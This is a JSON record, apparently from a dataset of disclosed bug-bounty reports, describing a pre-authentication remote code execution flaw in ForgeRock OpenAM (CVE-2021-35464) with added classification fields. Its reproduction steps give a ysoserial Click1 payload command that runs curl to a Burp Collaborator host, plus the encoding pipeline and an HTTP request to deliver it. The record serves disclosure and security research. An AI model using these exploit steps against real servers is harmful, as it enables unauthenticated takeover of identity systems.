{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "fdeleite ",
  "title": " Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)",
  "content": "\nRCE is possible thanks to unsafe Java deserialization in the Jato framework used by OpenAM.\nSupporting Material/References\nhttps://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464\nImpact\nAn unauthenticated, 3rd-party attacker or adversary can execute remote code\nSystem Host(s)\n\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nForgeRock OpenAM\nCVE Numbers\nCVE-2021-35464\nSteps to Reproduce\nFirst we need to build the payload:\nDownload this jar file wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar\nthen\njava -jar ysoserial-master-SNAPSHOT.jar Click1 \"curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net\" | (echo -ne \\\\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\\n' > payload.txt\nYou need to change the burp Collaborator id to test it properly.\nThe payload is now saved in the payload.txt file.\nNow we need to use the following request:\nCode 44 Bytes\n1GET /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=XYZ HTTP/1.1\n2Host: 127.0.0.1\nReplace XYZ by the payload saved into the payload.txt file.\nThe response\nCode 116 Bytes\n1HTTP/1.1 302 Found\n2Cache-Control: private\n3Location: https://127.0.0.1:443/openam/base/AMInvalidURL\n4Content-Length: 0\nThe HTTP Request sent the collaborator :\n\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1627602600,
  "report_url": "https://hackerone.com/reports/1248040",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Download the ysoserial payload generator jar file: `wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar`"
    ],
    [
      2,
      "Generate the payload with a command to trigger a request to a Burp Collaborator instance: `java -jar ysoserial-master-SNAPSHOT.jar Click1 \"curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net\" | (echo -ne \\\\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\\n' > payload.txt`"
    ],
    [
      3,
      "Send the payload in a GET request to the vulnerable OpenAM endpoint: `GET /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=XYZ HTTP/1.1` (replace XYZ with the contents of payload.txt)"
    ]
  ],
  "vuln_description": "This vulnerability allows unauthenticated remote code execution (RCE) in ForgeRock OpenAM via unsafe Java deserialization in the Jato framework. An attacker can craft a malicious serialized object that gets deserialized by the server, leading to arbitrary code execution.",
  "reason": "The attack requires multiple non-trivial steps including payload generation and encoding, but follows well-known Java deserialization attack patterns. The vulnerability itself is not novel (common deserialization flaw) and the components (ysoserial, base64 encoding) are standard tools/techniques in security testing.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves unsafe Java deserialization in the Jato framework used by OpenAM, which is a pre-authentication RCE. The methodology described focuses on authentication and authorization bypasses (IDOR, AuthN/AuthZ Bypass) within the same application by swapping user sessions or resource IDs. Since this RCE does not involve user sessions or resource IDs within the application context, but rather exploits a deserialization flaw in the framework itself, it falls outside the scope of the described methodology.",
    "is_detectable": false
  }
}